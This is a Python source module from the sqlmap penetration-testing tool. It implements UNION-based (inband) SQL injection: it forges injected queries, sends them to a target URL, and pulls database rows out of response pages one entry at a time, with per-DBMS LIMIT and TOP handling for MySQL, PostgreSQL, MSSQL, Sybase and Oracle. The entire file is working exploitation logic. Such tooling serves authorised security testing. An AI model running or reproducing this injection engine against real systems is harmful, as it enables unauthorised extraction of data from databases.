#!/usr/bin/env python

"""
$Id$

Copyright (c) 2006-2010 sqlmap developers (http://sqlmap.sourceforge.net/)
See the file 'doc/COPYING' for copying permission
"""

import re
import time

from lib.core.agent import agent
from lib.core.common import calculateDeltaSeconds
from lib.core.common import backend
from lib.core.common import getUnicode
from lib.core.common import initTechnique
from lib.core.common import isNumPosStrValue
from lib.core.common import parseUnionPage
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import queries
from lib.core.enums import DBMS
from lib.core.enums import PAYLOAD
from lib.core.exception import sqlmapSyntaxException
from lib.core.settings import FROM_TABLE
from lib.core.unescaper import unescaper
from lib.request.connect import Connect as Request
from lib.utils.resume import resume

reqCount = 0

def configUnion(char=None, columns=None):
    def __configUnionChar(char):
        if char.isdigit() or char == "NULL":
            conf.uChar = char
        elif not char.startswith("'") or not char.endswith("'"):
            conf.uChar = "'%s'" % char

    def __configUnionCols(columns):
        if "-" not in columns or len(columns.split("-")) != 2:
            raise sqlmapSyntaxException, "--union-cols must be a range with hyphon (e.g. 1-10)"

        columns = columns.replace(" ", "")
        conf.uColsStart, conf.uColsStop = columns.split("-")

        if not conf.uColsStart.isdigit() or not conf.uColsStop.isdigit():
            raise sqlmapSyntaxException, "--union-cols must be a range of integers"

        conf.uColsStart = int(conf.uColsStart)
        conf.uColsStop = int(conf.uColsStop)

        if conf.uColsStart > conf.uColsStop:
            errMsg = "--union-cols range has to be from lower to "
            errMsg += "higher number of columns"
            raise sqlmapSyntaxException, errMsg

    if isinstance(conf.uChar, basestring):
        __configUnionChar(conf.uChar)
    elif isinstance(char, basestring):
        __configUnionChar(char)

    if isinstance(conf.uCols, basestring):
        __configUnionCols(conf.uCols)
    elif isinstance(columns, basestring):
        __configUnionCols(columns)

def unionUse(expression, direct=False, unescape=True, resetCounter=False, unpack=True, dump=False):
    """
    This function tests for an inband SQL injection on the target
    url then call its subsidiary function to effectively perform an
    inband SQL injection on the affected url
    """

    initTechnique(PAYLOAD.TECHNIQUE.UNION)

    count = None
    origExpr = expression
    start = time.time()
    startLimit = 0
    stopLimit = None
    test = True
    value = ""

    global reqCount

    if resetCounter:
        reqCount = 0

    # Prepare expression with delimiters
    if unescape:
        expression = agent.concatQuery(expression, unpack)
        expression = unescaper.unescape(expression)

    if kb.injection.data[PAYLOAD.TECHNIQUE.UNION].where == 2 and not direct:
        _, _, _, _, _, expressionFieldsList, expressionFields, _ = agent.getFields(origExpr)

        # We have to check if the SQL query might return multiple entries
        # and in such case forge the SQL limiting the query output one
        # entry per time
        # NOTE: I assume that only queries that get data from a table can
        # return multiple entries
        if " FROM " in expression.upper() and ((backend.getIdentifiedDbms() not in FROM_TABLE) or (backend.getIdentifiedDbms() in FROM_TABLE and not expression.upper().endswith(FROM_TABLE[backend.getIdentifiedDbms()]))) and "EXISTS(" not in expression.upper():
            limitRegExp = re.search(queries[backend.getIdentifiedDbms()].limitregexp.query, expression, re.I)
            topLimit = re.search("TOP\s+([\d]+)\s+", expression, re.I)

            if limitRegExp or (backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.SYBASE) and topLimit):
                if backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
                    limitGroupStart = queries[backend.getIdentifiedDbms()].limitgroupstart.query
                    limitGroupStop = queries[backend.getIdentifiedDbms()].limitgroupstop.query

                    if limitGroupStart.isdigit():
                        startLimit = int(limitRegExp.group(int(limitGroupStart)))

                    stopLimit = limitRegExp.group(int(limitGroupStop))
                    limitCond = int(stopLimit) > 1

                elif backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.SYBASE):
                    if limitRegExp:
                        limitGroupStart = queries[backend.getIdentifiedDbms()].limitgroupstart.query
                        limitGroupStop = queries[backend.getIdentifiedDbms()].limitgroupstop.query

                        if limitGroupStart.isdigit():
                            startLimit = int(limitRegExp.group(int(limitGroupStart)))

                        stopLimit = limitRegExp.group(int(limitGroupStop))
                        limitCond = int(stopLimit) > 1
                    elif topLimit:
                        startLimit = 0
                        stopLimit = int(topLimit.group(1))
                        limitCond = int(stopLimit) > 1

                elif backend.getIdentifiedDbms() == DBMS.ORACLE:
                    limitCond = False
            else:
                limitCond = True

            # I assume that only queries NOT containing a "LIMIT #, 1"
            # (or similar depending on the back-end DBMS) can return
            # multiple entries
            if limitCond:
                if limitRegExp:
                    stopLimit = int(stopLimit)

                    # From now on we need only the expression until the " LIMIT "
                    # (or similar, depending on the back-end DBMS) word
                    if backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
                        stopLimit += startLimit
                        untilLimitChar = expression.index(queries[backend.getIdentifiedDbms()].limitstring.query)
                        expression = expression[:untilLimitChar]

                    elif backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.SYBASE):
                        stopLimit += startLimit
                elif dump:
                    if conf.limitStart:
                        startLimit = conf.limitStart
                    if conf.limitStop:
                        stopLimit = conf.limitStop

                if not stopLimit or stopLimit <= 1:
                    if backend.getIdentifiedDbms() in FROM_TABLE and expression.upper().endswith(FROM_TABLE[backend.getIdentifiedDbms()]):
                        test = False
                    else:
                        test = True

                if test:
                    # Count the number of SQL query entries output
                    countFirstField = queries[backend.getIdentifiedDbms()].count.query % expressionFieldsList[0]
                    countedExpression = origExpr.replace(expressionFields, countFirstField, 1)

                    if re.search(" ORDER BY ", expression, re.I):
                        untilOrderChar = countedExpression.index(" ORDER BY ")
                        countedExpression = countedExpression[:untilOrderChar]

                    count = resume(countedExpression, None)

                    if not stopLimit:
                        if not count or not count.isdigit():
                            output = unionUse(countedExpression, direct=True)

                            if output:
                                count = parseUnionPage(output, countedExpression)

                        if isNumPosStrValue(count):
                            stopLimit = int(count)

                            infoMsg = "the SQL query used returns "
                            infoMsg += "%d entries" % stopLimit
                            logger.info(infoMsg)

                        elif count and not count.isdigit():
                            warnMsg = "it was not possible to count the number "
                            warnMsg += "of entries for the used SQL query. "
                            warnMsg += "sqlmap will assume that it returns only "
                            warnMsg += "one entry"
                            logger.warn(warnMsg)

                            stopLimit = 1

                        elif (not count or int(count) == 0):
                            warnMsg = "the SQL query used does not "
                            warnMsg += "return any output"
                            logger.warn(warnMsg)

                            return None

                    elif (not count or int(count) == 0) and (not stopLimit or stopLimit == 0):
                        warnMsg = "the SQL query used does not "
                        warnMsg += "return any output"
                        logger.warn(warnMsg)

                        return None

                    try:
                        for num in xrange(startLimit, stopLimit):
                            if backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.SYBASE):
                                field = expressionFieldsList[0]
                            elif backend.getIdentifiedDbms() == DBMS.ORACLE:
                                field = expressionFieldsList
                            else:
                                field = None

                            limitedExpr = agent.limitQuery(num, expression, field)
                            output = resume(limitedExpr, None)

                            if not output:
                                output = unionUse(limitedExpr, direct=True, unescape=False)

                            if output:
                                value += output
                                parseUnionPage(output, limitedExpr)

                    except KeyboardInterrupt:
                        print
                        warnMsg = "Ctrl+C detected in dumping phase"
                        logger.warn(warnMsg)

                    return value

        value = unionUse(expression, direct=True, unescape=False)

    else:
        # Forge the inband SQL injection request
        vector = kb.injection.data[PAYLOAD.TECHNIQUE.UNION].vector
        query = agent.forgeInbandQuery(expression, vector[0], vector[1], vector[2], vector[3], vector[4], vector[5])
        payload = agent.payload(newValue=query)

        # Perform the request
        resultPage, _ = Request.queryPage(payload, content=True)
        reqCount += 1

        if kb.misc.start not in resultPage or kb.misc.stop not in resultPage:
            return

        # Parse the returned page to get the exact inband
        # sql injection output
        startPosition = resultPage.index(kb.misc.start)
        endPosition = resultPage.rindex(kb.misc.stop) + len(kb.misc.stop)
        value = getUnicode(resultPage[startPosition:endPosition])

        duration = calculateDeltaSeconds(start)

        debugMsg = "performed %d queries in %d seconds" % (reqCount, duration)
        logger.debug(debugMsg)

    return value
